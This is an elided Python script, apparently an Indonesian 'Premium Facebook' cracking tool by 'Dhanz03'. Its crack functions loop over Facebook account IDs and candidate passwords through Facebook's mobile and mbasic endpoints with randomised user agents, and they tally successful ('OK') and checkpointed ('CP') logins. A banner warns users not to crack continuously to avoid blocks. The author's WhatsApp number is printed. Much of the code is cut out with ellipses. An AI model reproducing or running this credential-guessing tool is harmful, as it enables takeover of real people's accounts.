...
Script : Premium Facebook
Note : Belum Tentu Ijo Karna Sistem Berbeda
Note : Jangan Crack Terus Menerus Nanti Mokad !!
      Author : Dhanz03
                           {P}  ''')   
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def authorx():
	...
	cetak(nel(f"""AUTHOR Dhanz Maker
WA Dhanz: +6285881856121
WA Maker : +6285881856121"""))
...
def setting():
	...
	print(f'{P}├──1 mobile.{H}facebook.com{P} ({H}recommended{P})')
	print(f'{P}├──2 mbasic.{K}mbasic.facebook.com{P} ({B}recommended )')
	print(f'{P}├──3 touch.{H}touch.facebook.com{P} ({B}recommended )')
	print(f'{P}├──4 free.{M}free.facebook.com{P} ({B}recommended )')
	print(f'{P}├──5 mobile.{M}facebook.com{P} ({B}recommended )')
	print(f'{P}├──6 mbasic.{K}mbasic.facebook.com{P} ({B}recommended )')
	hc = input(f'{P}├── pilih : ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r Dhanz❃{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackmbasic(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s{P}[{M}• {K}• {H}• {P}DHANZ!{M}• {K}• {H}•{P}] OK:{P}[{H}%s{P}]{K}CP:{P}[{K}%s{P}] {P}[{M}%s%s%s{P}]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
